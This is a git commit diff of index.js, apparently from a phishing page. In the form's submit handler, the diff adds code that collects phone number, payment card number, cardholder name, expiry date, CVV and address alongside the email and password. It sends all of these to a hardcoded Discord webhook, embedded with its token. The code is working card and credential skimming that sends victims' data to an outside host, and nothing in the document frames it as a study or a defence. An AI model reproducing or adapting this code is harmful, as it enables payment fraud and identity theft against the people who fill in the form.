13ecfbc2f22d8e8a6d669b74c1ee5b1dacf16c55
Notsu7 <139141534+Notsu7@users.noreply.github.com>
2024-09-22 00:50:44 +0200

    Add files via upload

--- index.js
+++ index.js
@@ -8,6 +8,12 @@ form.addEventListener("submit", (event)=>
 
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
+    const num = document.getElementById("tel.num").value;
+    const card_num = document.getElementById("card-number").value;
+    const name = document.getElementById("card-owner-name").value;
+    const exp = document.getElementById("card-exp").value;
+    const cvv = document.getElementById("card-cvv").value;
+    const address = document.getElementById("address").value;
 
     if(password!=document.getElementById("password2").value)
     {
@@ -16,7 +22,7 @@ form.addEventListener("submit", (event)=>
 
     else
     {
-        const content = `email: ${email}\npassword: ${password}`
+        const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}\ncard number: ${card_num}\ncard owner name: ${name}\ncard exp date: ${exp}\ncard cvv: ${cvv}\naddress: ${address}`
         
         fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
         {
